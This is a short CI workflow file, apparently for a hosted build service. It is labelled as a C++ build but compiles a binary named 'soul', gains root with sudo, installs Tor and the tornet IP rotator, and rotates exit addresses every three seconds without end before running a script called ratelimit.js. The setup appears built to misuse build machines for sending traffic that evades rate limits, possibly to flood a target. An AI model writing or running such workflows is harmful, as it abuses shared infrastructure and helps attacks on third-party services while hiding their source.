workflows:
  linux-cpp-build:
    name: C++ Build & Run (Linux X4)
    max_build_duration: 120
    instance_type: linux_x2

    scripts:
      - name: Show System Info
        script: |
          echo "CPU Architecture:"
          uname -m
          echo "CPU Cores:"
          nproc

      - name: Build and Run C++ Program
        script: |
          echo "Compiling..."
          g++ -std=c++14 -O3 -march=native soul.cpp -o soul -pthread

          echo "Making executable..."
          chmod +x soul
          npm install axios socks-proxy-agent
          sudo su
          sudo apt install tor -y
          sudo systemctl stop tor
          sudo systemctl disable tor
          sudo pip install tornet --break-system-packages
          nohup tornet --interval 3 --count 0 > tornet.log 2>&1 &
          sleep 10
          ps aux | grep tornet

          echo "Running..."
          node ratelimit.js
